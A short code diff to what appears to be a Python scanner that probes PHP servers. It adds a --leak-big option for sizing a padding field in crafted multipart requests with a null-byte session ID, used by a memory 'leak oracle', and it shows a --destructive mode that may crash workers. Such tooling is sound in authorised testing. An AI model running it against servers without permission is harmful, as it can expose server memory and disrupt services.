@@ -450,7 +450,7 @@ class Scanner:
         parts += [("PHPSESSID", b"\0"),
                   (PROG, b"p2s"),
                   ("f", b"A" * 64, "a.txt"),
-                  ("big", b"B" * self.LEAK_BIG)]
+                  ("big", b"B" * self.opts.leak_big)]
         return parts
 
     def _leak_read_parts(self, marker_byte):
@@ -753,6 +753,10 @@ def build_parser():
                     help="T2 ladder body cap (default 8 MiB; raise for large post_max_size)")
     ap.add_argument("--leak-tries", type=int, default=3,
                     help="T2 leak oracle attempts (default 3)")
+    ap.add_argument("--leak-big", type=int, default=12 * 1024 * 1024,
+                    help="T2 arm big-field size in bytes (default 12 MiB; "
+                         "set ~75%% of the target memory_limit, must stay "
+                         "under its post_max_size)")
     ap.add_argument("--destructive", action="store_true",
                     help="enable T3 kill-receipt rounds (may crash workers)")
     ap.add_argument("--kill-rounds", type=int, default=3)
